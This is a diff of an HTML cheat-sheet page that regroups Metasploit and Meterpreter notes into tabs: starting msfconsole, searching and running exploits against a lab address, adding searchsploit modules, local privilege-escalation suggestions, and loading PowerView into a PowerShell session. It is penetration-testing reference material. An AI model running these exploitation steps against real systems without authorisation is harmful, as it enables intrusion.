@@ -205,17 +205,26 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="metasploit">Metasploit</h3>
-<h4 id="start-metasploit">Start Metasploit</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">msfconsole</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >meterpreter</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="start-msfconsole">Start msfconsole</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole -q
-</span></span></code></pre></div><h4 id="basic-commands">Basic Commands</h4>
+</span></span></code></pre></div></div>
+<h4 id="basic-commands">Basic Commands</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Return to previous page</span>
 </span></span><span class="line"><span class="cl">back
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Upgrade session</span>
 </span></span><span class="line"><span class="cl">sessions -u
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># quit metasploit</span>
 </span></span><span class="line"><span class="cl"><span class="nb">exit</span>
-</span></span></code></pre></div><h4 id="search-exploit">Search Exploit</h4>
+</span></span></code></pre></div></div>
+<h4 id="search-exploit">Search Exploit</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example: samba</span>
 </span></span><span class="line"><span class="cl">search samba
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Choose by #num</span>
@@ -230,13 +239,37 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">1337</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
 </span></span><span class="line"><span class="cl">run 
-</span></span></code></pre></div><p><small><em>Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</em></small></p>
-<hr>
-<h3 id="meterpreter">Meterpreter</h3>
-<h4 id="basic-commands-1">Basic Commands</h4>
+</span></span></code></pre></div></div>
+<p><small><em>Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</em></small></p>
+<h4 id="add-scripts-from-searchsploit">Add scripts from searchsploit</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p ~/.msf4/modules/exploits/linux
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p ~/.msf4/modules/exploits/windows
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example a linux script</span>
+</span></span><span class="line"><span class="cl">cp 12345.rb ~/.msf4/modules/exploits/linux
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Inside msfconsole</span>
+</span></span><span class="line"><span class="cl">reload_all
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Search</span>
+</span></span><span class="line"><span class="cl">search <span class="m">12345</span>
+</span></span></code></pre></div></div>
+<h4 id="fix-no-search-result">Fix no search result</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Inside msfconsole, check db status</span>
+</span></span><span class="line"><span class="cl">db_status
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo service postgresql start
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">update-rc.d postgresql <span class="nb">enable</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfdb init
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Go bask to msfconsole and check again</span>
+</span></span><span class="line"><span class="cl">db_status
+</span></span></code></pre></div></div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="basic-commands">Basic Commands</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Return from meterpreter</span>
 </span></span><span class="line"><span class="cl">background
-</span></span></code></pre></div><h4 id="use-exploit">Use Exploit</h4>
+</span></span></code></pre></div></div>
+<h4 id="use-exploit">Use Exploit</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Quick look of potential privesc (Windows)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># Need to return from meterpreter</span>
 </span></span><span class="line"><span class="cl">use post/multi/recon/local_exploit_suggester
@@ -248,34 +281,18 @@
 </span></span><span class="line"><span class="cl"><span class="nb">set</span> rhosts 10.10.11.10
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run exploit</span>
 </span></span><span class="line"><span class="cl">run 
-</span></span></code></pre></div><h4 id="use-powershell">Use powershell</h4>
+</span></span></code></pre></div></div>
+<h4 id="use-powershell">Use powershell</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use powershell module</span>
 </span></span><span class="line"><span class="cl">use powershell
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Import module</span>
 </span></span><span class="line"><span class="cl">powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Spawn powershell session</span>
 </span></span><span class="line"><span class="cl">powershell_shell 
-</span></span></code></pre></div><br>
-<hr>
-<h3 id="custom-scripts">Custom Scripts</h3>
-<h4 id="add-scripts-from-searchsploit">Add scripts from searchsploit</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p ~/.msf4/modules/exploits/linux
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p ~/.msf4/modules/exploits/windows
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example a linux script</span>
-</span></span><span class="line"><span class="cl">cp 12345.rb ~/.msf4/modules/exploits/linux
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Inside msfconsole</span>
-</span></span><span class="line"><span class="cl">reload_all
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Search</span>
-</span></span><span class="line"><span class="cl">search <span class="m">12345</span>
-</span></span></code></pre></div><h4 id="fix-no-search-result">Fix no search result</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Inside msfconsole, check db status</span>
-</span></span><span class="line"><span class="cl">db_status
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo service postgresql start
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">update-rc.d postgresql <span class="nb">enable</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo msfdb init
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Go bask to msfconsole and check again</span>
-</span></span><span class="line"><span class="cl">db_status
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
